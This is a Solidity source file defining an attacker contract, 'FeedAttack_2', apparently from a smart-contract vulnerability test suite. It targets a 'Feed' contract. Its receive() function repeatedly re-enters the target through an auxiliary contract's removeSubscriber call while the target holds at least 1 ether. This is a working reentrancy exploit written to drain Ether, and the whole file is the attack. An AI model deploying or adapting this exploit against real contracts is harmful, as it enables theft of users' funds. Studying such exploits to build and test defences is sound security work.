// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

import "../custom/Feed.sol";
import "./FeedAttack_2_Aux.sol";

contract FeedAttack_2 {
    Feed private _contract;
    FeedAttack_2_Aux private auxContract;

    constructor() {}

    // Receive is called when the contract sends Ether to the attacker contract.
    receive() external payable {
        if (address(_contract).balance >= 1 ether) {
            _removeSubscriber();
        }
    }

    function attack() external payable {
        _removeSubscriber();
    }

    function subscribe() public payable {
        _contract.subscribe{value: msg.value}();
    }

    function _removeSubscriber() private {
        auxContract.removeSubscriber(address(this));
    }

    function setFeedAddress(address _address) external {
        _contract = Feed(_address);
    }

    function setAuxAddress(address _address) external {
        auxContract = FeedAttack_2_Aux(_address);
        auxContract.setFeedAddress(address(_contract));
    }
}
